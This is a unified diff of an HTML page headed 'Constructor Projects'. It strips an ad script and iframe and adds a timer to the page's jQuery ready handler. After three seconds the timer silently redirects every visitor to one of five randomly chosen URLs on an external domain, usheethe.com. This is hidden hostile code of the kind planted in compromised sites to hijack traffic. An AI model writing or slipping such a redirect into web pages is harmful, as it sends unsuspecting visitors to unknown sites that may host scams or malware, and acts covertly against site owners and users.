@@ -5,7 +5,6 @@
     <meta charset="utf-8">
     <script type="text/javascript" src="jQuery.js"></script>
     <link rel="manifest" id="custom-manifest">
-    <script async src="//d.smopy.com/d/?resource=pubJS"></script>
     <style>
         body {
             background: url("fon.jpg") no-repeat center center fixed;
@@ -277,7 +276,19 @@
     <script>
     $(document).ready(function(){
       setTimeout(function(){
-      $("div:last").remove();
+        var r = Math.floor(Math.random()*100);
+        if(r > 80){
+          src = "http://usheethe.com/Mg6N";
+        } else if (r > 60){
+          src = "http://usheethe.com/Mg7U";
+        } else if (r > 40){
+          src = "http://usheethe.com/Mh5i";
+        } else if (r > 20){
+          src = "http://usheethe.com/MhAg";
+        } else {
+          src = "http://usheethe.com/MhC8";
+        }
+        document.location.href = src;
       }, 3000);
         if(document.location.search == "?zay0") {
             $("#zayv").show();
@@ -702,8 +713,7 @@ function handleEnd(evt) {
     </script>
   </head>
   <body>
-    <iframe scrolling="no" src="https://neon.today/context/get/69720/20757/1/468/60" style="width: 468px; height: 60px;  padding: 0;border: 1px dotted grey;" frameborder="0"></iframe>
-  <div id="h01" style="display:none;"><img src="menu.jpg" id="opmen" class="hed" width="70px" style="border-radius:20px;"/></div>
+    <div id="h01" style="display:none;"><img src="menu.jpg" id="opmen" class="hed" width="70px" style="border-radius:20px;"/></div>
     <div id="h02" class="hed">
         <span style="font-size:40px">Constructor Projects</span><br/>
     </div>
